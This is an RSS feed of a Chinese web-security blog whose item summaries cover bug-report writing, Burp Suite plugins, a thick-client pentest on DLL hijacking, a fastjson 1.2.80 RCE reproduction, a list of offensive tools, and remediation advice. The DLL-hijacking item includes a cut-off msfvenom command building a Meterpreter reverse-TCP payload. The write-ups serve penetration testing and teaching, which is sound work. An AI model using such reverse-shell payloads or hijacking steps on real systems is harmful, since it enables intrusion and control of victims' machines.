<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>web安全 on Olist.213</title>
    <link>https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/</link>
    <description>Recent content in web安全 on Olist.213</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Mon, 03 Apr 2023 21:22:56 +0800</lastBuildDate><atom:link href="https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Write_good_bug_reports</title>
      <link>https://olist213.github.io/posts/write_good_bug_reports/</link>
      <pubDate>Mon, 03 Apr 2023 21:22:56 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/write_good_bug_reports/</guid>
      <description>具体要点    确定漏洞类型：首先要明确漏洞的类型，并对其进行分类和描述。
  重现漏洞：在报告中提供重现漏洞的步骤和环境。
  提供详细信息：在漏洞报告中提供尽可能多的信息，例如操作系统，浏览器版本和漏洞所在的应用程序版本等。
  描述漏洞的影响：在报告中描述漏洞的影响和可能对系统造成的损害。
  提供解决方案：在漏洞报告中提供解决方案或建议。
  应该保持专业：在报告中避免使用过度的情绪化或不适当的语言。
  给漏洞指定一个严重程度：给漏洞指定一个适当的严重程度，例如高、中、低等级别。
  与开发人员协作：最好与应用程序的开发团队合作，以便更好地理解和修复漏洞。
  报告漏洞时保密：在报告漏洞时要保持保密，并且只将漏洞信息通知有关方面。
  确认漏洞已得到修复：在漏洞得到修复后，最好要进行验证，以确保漏洞已被妥善修复。
  FROM</description>
    </item>
    
    <item>
      <title>Burpsuite_plugins</title>
      <link>https://olist213.github.io/posts/burpsuite_plugins/</link>
      <pubDate>Mon, 03 Apr 2023 10:12:22 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/burpsuite_plugins/</guid>
      <description>插件名称 url 描述     JS Link Finder BApp Store 被动扫描js文件内的url   Turbo Intruder BApp Store 用于发送大量HTTP请求并分析结果（爆破）   HAE https://github.com/gh0stkey/HaE 请求高亮标记与信息提取   CO2 BApp Store 加了一些工具   BurpShiroPassiveScan https://github.com/pmiaowu/BurpShiroPassiveScan 基于BurpSuite的被动式shiro检测插件   APIKit https://github.com/API-Security/APIKit 主动/被动扫描发现应用泄露的API文档   xia SQL https://github.com/smxiazi/xia_sql 简单的判断注入   BurpFastJsonScan https://github.com/pmiaowu/BurpFastJsonScan 被动式FastJson检测   Log4j2Scan https://github.com/whwlsfb/Log4j2Scan Log4j2被动扫描   log4j2burpscanner https://github.com/f0ng/log4j2burpscanner Log4j2被动扫描   Flow BApp Store 筛选来自Burp工具的所有完整和不完整请求   Autorize BApp Store 授权检测插件   shiro scan https://github.</description>
    </item>
    
    <item>
      <title>记一次胖客户端程序渗透测试</title>
      <link>https://olist213.github.io/posts/thick_client_penetration_testing/</link>
      <pubDate>Sat, 01 Apr 2023 23:13:41 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/thick_client_penetration_testing/</guid>
      <description>胖客户端就是我们常说的C/S架构的应用程序，其主要特点是客户端执行部分应用逻辑，服务器端则提供存储和计算支持，两者之间通过网络进行通信和交互。而我们常说的“瘦客户端”就是基于B/S架构的应用程序，也就是基于浏览器的应用程序。
拿到一个胖客户端程序可以先看下胖客户端是什么架构，一般像后缀是exe结尾的，很多都是C、C#或者.NET编译的。
可以通过CFF Explorer查看目标程序的架构，如下图。
可以看到，这是一个32位的程序，利用Microsoft Visual Studio .NET编译，是一个.net程序。
像这种.NET的程序，可以用dnspy（GitHub - dnSpy/dnSpy: .NET debugger and assembly editor），DNspy是一款著名的.NET反编译器，可以反编译.NET编译后的文件，包括可执行文件（exe）、DLL文件、NET程序集等。使用DNspy反编译exe文件可以方便地查看其源代码和内部结构，帮助理解和分析程序的运行机制。
可以从中看到sql语句查询，从这里我们可以看到sql语句未做任何过滤，直接拼接，但是这里直接加了单引号，导致每次查询都会多有一个单引号，没法绕过。
但是如果客户端程序可以直接反编译的话，那么如果说客户端程序在没做任何签名的情况下，可以重新编译，打包成另一个程序，后果就是可以伪造官方客户端，从中写入恶意文件，通过这种方式可以进行钓鱼等攻击。
此处不放图了，修改后，可以直接像正常客户端程序那样使用。
也可以通过wireshark或者科来对其流量进行检测，检测应用在传输的过程中是否泄漏敏感信息。
从上图可以看出，此胖客户端使用tds数据库协议，节点的ip地址、端口等内容。
还包括在传输过程中泄漏了sql语句
除了wireshark和科来等工具分析流量之外，echo mirage也可以用来进行流量分析，可自行下载使用。
接下来，回到我们的这篇文章的正题，dll劫持漏洞，既然是胖客户端应用，那么就会加载各类dll文件。
DLL劫持（DLL Hijacking）是一种攻击技术，利用系统在加载动态链接库（DLL）时的搜索顺序错误或缺陷，在系统中寻找可用的DLL文件时，将正常的文件替换成恶意文件，使得系统加载并执行了被控制的DLL文件，达到攻击者的目的。
DLL劫持攻击的危害大，可以被用于各种恶意活动，例如：
1、窃取敏感信息：恶意DLL文件可能会窃取用户的敏感信息，例如登录账号、密码等。 2、执行远程指令：通过劫持DLL文件，攻击者可能会远程控制用户的计算机执行恶意指令，例如下载、安装其他恶意程序等。 3、破坏系统的完整性和稳定性：劫持的DLL文件可能会破坏系统的安全性、完整性和稳定性，例如篡改系统设置、破坏系统文件等。
dll劫持利用的第一步是获取可利用的dll文件。
这个时候就的使用Sysinternals Suite套件，利用套件下的Procmon Monitor工具，可以查看当前运行的程序的相关进程情况。
加载后可以看到各类当前运行程序的进程名、PID、路径等，按ctrl+L过滤处特定程序的进程。
同时如果目标程序加载了配置文件的话，通过这个工具也可以查看到。
既然是dll劫持，那么我们就要去找可利用的dll。
在目标程序的目录下，找到了一个DWrite.dll文件，这个文件是Windows操作系统的一部分，它是DirectWrite API动态链接库文件。DirectWrite是一个用于渲染文本和字体的API，它使用硬件加速和先进的字体渲染技术来提供更高质量、更清晰的文本呈现效果。
在Windows系统中，许多应用程序（比如Adobe Creative Suite等）都会使用DirectWrite技术来渲染文本和字体，因此dwrite.dll文件在许多应用程序中都会被调用和使用。
可以通过搜索去搜索NAME NOT FOUND的这种进程。
找dll可以多尝试几个dll文件，除了找到dll文件，还需要了解windows下dll文件的加载顺序。
1、搜索应用程序所在目录 2、Windows系统目录（如C:\Windows\System32） 3、常规的windows目录（ C:\Windows\System32 和 C:\Windows） 4、搜索 Administrator 类型的 Windows 系统目录（如C:\Windows\SystemWOW64） 5、搜索 PATH 环境变量中的所有目录 6、当前工作目录
操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。
了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。
msfvenom -p windows/meterpreter/reverse_tcp LHOST= 192.</description>
    </item>
    
    <item>
      <title>一些工具(updating)</title>
      <link>https://olist213.github.io/posts/tools_resoure/</link>
      <pubDate>Sat, 01 Apr 2023 14:01:34 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/tools_resoure/</guid>
      <description>工具名称 工具链接 工具描述 更新时间     Fastjson 扫描器 https://github.com/a1phaboy/FastjsonScan fastjson扫描 无   FastjsonPatrol https://github.com/ce-automne/FastjsonPatrol 一款探测fastjson漏洞的BurpSuite插件 2022.4.1   Log4j2Scan https://github.com/whwlsfb/Log4j2Scan Log4j2 burpsuite被动扫描插件 2022.10.21   SpringBootExploit https://github.com/0x727/SpringBootExploit springboot漏洞利用工具 2022.4.17   EHole(棱洞)3.0 https://github.com/EdgeSecurityTeam/EHole 红队重点攻击系统指纹探测工具 2021.7.23   xray https://github.com/chaitin/xray 自动化安全测试工具 2023.1.10   HackBrowserData https://github.com/moonD4rk/HackBrowserData 提取和导出Chrome、Firefox、Edge、Opera等主流浏览器的历史记录、书签、密码等数据的工具 2022.8.16   fscan https://github.com/shadow1ng/fscan 轻量级的网络安全扫描工具 2023.2.22   Yakit https://github.com/yaklang/yakit ALL-IN-ONE Platform 2023.4.2   pocsuite3 https://github.com/knownsec/pocsuite3 漏洞测试框架 2023.</description>
    </item>
    
    <item>
      <title>fastjson 80远程代码执行漏洞复现</title>
      <link>https://olist213.github.io/posts/fastjson_80_rce/</link>
      <pubDate>Wed, 29 Mar 2023 15:59:44 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/fastjson_80_rce/</guid>
      <description>项目地址 GitHub - Lonely-night/fastjsonVul at 7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
利用条件  fastjson版本： 1.2.76 &amp;lt;= fastjson &amp;lt; 1.2.83 存在groovy依赖  复现步骤 1、编译attack模块为attack-1.jar包
2、在attack-1.jar包所在的目录下执行启用http服务。
python -m SimpleHTTPServer 8433
3、运行poc
利用idea重新打开项目，项目路径：
jdk版本切换成1.8
打开poc.java文件，这个文件是漏洞验证的payload。
右键运行
成功运行payload</description>
    </item>
    
    <item>
      <title>网页篡改漏洞描述</title>
      <link>https://olist213.github.io/posts/web_page_tampering/</link>
      <pubDate>Thu, 14 Feb 2019 11:21:08 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/web_page_tampering/</guid>
      <description>网页篡改 风险等级:高危漏洞描述
针对网站程序漏洞，植入木马 (webshell、跨站脚本攻击)，篡改网页，添加黑链或者嵌入非本站信息，甚至是创建恶意网页，通常为博彩、私服篡改居多。
漏洞危害
网站已被恶意攻击者控制，浏览器提示非法网站，不予访问，对网站自身形象不利。
解决建议
1、对服务器进行木马查杀，看是否存在被恶意控制的脚本，对网站进行测试，发现应用存在的缺陷。
2、删除恶意的篡改内容
3、通过申诉，更新快照。
4、部署网页防篡改保护系统
5、通过在线7*24小时云平台进行挂马检测/网页木马检测/黑链检测，通过在线服务平台的挂马特征库（云监控平台自学习系统动态增加挂马特征），对网页的挂马 / 木马和页面特征进行分析，识别出挂马、木马和挂黑链等安全问题。
6、服务器日常的运维过程中，定期通过杀毒软件对服务器进行扫描，定期更换服务器密码，定期删除过期的用户，及时更新操作系统的补丁。</description>
    </item>
    
    <item>
      <title>web漏洞描述与解决建议</title>
      <link>https://olist213.github.io/posts/web_vulnerability_description/</link>
      <pubDate>Fri, 25 Jan 2019 16:42:15 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/web_vulnerability_description/</guid>
      <description>&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;code&gt;内容均来自互联网，风险等级根据实际情况定义&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;通用建议&#34;&gt;通用建议&lt;/h2&gt;
&lt;p&gt;1、建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。&lt;/p&gt;
&lt;p&gt;2、定期对网站及应用系统进行全面安全检查，保障系统安全运行，如有条件，可聘请第三方专业安全服务公司协助进行。&lt;/p&gt;
&lt;p&gt;3、定期对相关管理人员和技术人员进行安全培训，提高安全技术能力和实际操作能力。&lt;/p&gt;
&lt;p&gt;4、采用专业的Web安全防护产品，可以在不修改网站本身的情况下对大多数的Web攻击起到有效的阻断作用。&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
